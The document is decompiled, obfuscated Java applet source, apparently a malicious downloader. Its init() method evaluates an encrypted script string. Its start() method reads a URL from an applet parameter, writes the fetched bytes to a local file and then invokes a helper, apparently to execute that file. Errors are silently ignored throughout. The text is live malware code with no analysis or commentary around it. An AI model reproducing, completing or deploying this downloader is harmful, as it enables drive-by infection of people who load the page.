import java.io.InputStream;
import java.io.FileOutputStream;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class l extends Applet
{
    private JList ALLATORI_DEMO;
    
    public static String b(final String a) {
        final int n = 1 << 3;
        final int n2 = (0x2 ^ 0x5) << 4 ^ (0x3 ^ 0x5) << 1;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    @Override
    public void init() {
        try {
            final k k = new k();
            k.ALLATORI_DEMO.eval(r.b(r.ALLATORI_DEMO(k.ALLATORI_DEMO("\b.\u0014s\u0010'\u001fe^r\f.\u0014s\u0010'\fxG}\u001ayNe^*^y\u001b.\u0014s\u0010'\t7;eG}\u001ayNe\u0011.\u0014s\u0010'\f?\\.\u0014s\u0010'\u00077\u001beG}\u001ayNe\u0011.\u0014s\u0010'\f5W,\n\u007fG}\u001ayN~\r9\nxG}\u001ayND\neG}\u001ayN~\u0010.\u0014s\u0010'\u00197C7\u0018bG}\u001ayNy\u001d.\u0014s\u0010'\n~\u0011yV>\u00057\u0014vG}\u001ayNa\u001f9\u0012vG}\u001ayNy\u00199-nG}\u001ayNd\nrG}\u001ayNzPd\u001b.\u0014s\u0010'\nD\u001b.\u0014s\u0010'\u001db\f.\u0014s\u0010'\u0017c\u0007Z\u001fy\u001f.\u0014s\u0010'\u0019r\f?\u0010bG}\u001ayN{\u0012>Ev\u000egG}\u001ayN{\u001bcPd\n.\u0014s\u0010'\u001feG}\u001ayNcV>Ee\u001b.\u0014s\u0010'\nbG}\u001ayNe\u00107\\r\u0006.\u0014s\u0010'\u000e{\u0011.\u0014s\u0010'\u0017c_5EjEr\f.\u0014s\u0010'\f.\u0014s\u0010'\u0011ePz\u001bd\r.\u0014s\u0010'\u001fpG}\u001ayNr^*^c\u0016~G}\u001ayNdE"))).replace(r.b(r.ALLATORI_DEMO(y.E("ZN\u0007JS"))), ""));
            this.add(this.ALLATORI_DEMO = new JList(new Object[] { k.ALLATORI_DEMO.get(r.b(r.ALLATORI_DEMO(k.ALLATORI_DEMO("\u001beG}\u001ayNe\u0011.\u0014s\u0010'\f"))).replace(r.b(r.ALLATORI_DEMO(y.E("ZN\u0007JS"))), "")) }));
        }
        catch (ScriptException ex) {}
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = 5 << 3 ^ 0x3;
        final int n2 = 2 << 3 ^ 0x4;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final int n4 = n2;
        final char c = (char)n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char c2 = (char)(a.charAt(n5) ^ c);
            --n3;
            array3[n5] = c2;
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char char1 = a.charAt(n6);
            --n3;
            array4[n6] = (char)(char1 ^ n4);
            i = n3;
        }
        return new String(array2);
    }
    
    private void ALLATORI_DEMO() {
    }
    
    @Override
    public void start() {
        try {
            String s = new r().ALLATORI_DEMO();
            final String s2 = new String();
            final String s3 = s;
            if (s3.charAt(s3.length() - 1) != '\\') {
                s = new StringBuilder().insert(0, s).append(r.b(r.ALLATORI_DEMO(k.ALLATORI_DEMO("\"")))).toString();
            }
            final String string = new StringBuilder().insert(0, s).append(r.b(r.ALLATORI_DEMO(y.E("\u000bE\u0015F\u0002@\u0007\u0017\u0002R\u0001EQ\n\u0006E\u0015F\u0002\\\u0002R\u0001E\u0006"))).replace(r.b(r.ALLATORI_DEMO(k.ALLATORI_DEMO("v\bu\u001f"))), "")).toString();
            final String s4 = new String();
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            final String s5 = new String();
            final String s6 = new String();
            final String parameter = this.getParameter(r.b(r.ALLATORI_DEMO(y.E("@\u0006W\u0017"))));
            final String s7 = new String();
            final InputStream allatori_DEMO = y.ALLATORI_DEMO(parameter);
            final String s8 = new String();
            byte[] array = new byte[153601];
            final String s9 = new String();
            final byte[] array2 = new byte[100];
            final String s10 = new String();
            InputStream inputStream = allatori_DEMO;
            byte[] array3 = array;
            int read;
            while ((read = inputStream.read(array3)) > 0) {
                final String s11 = new String();
                final int n = 153601;
                fileOutputStream.write(array, 0, read);
                array = new byte[n];
                inputStream = allatori_DEMO;
                array3 = array;
            }
            final String s12 = new String();
            fileOutputStream.close();
            final String s13 = new String();
            allatori_DEMO.close();
            try {
                final String s14 = new String();
                y.b(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
}
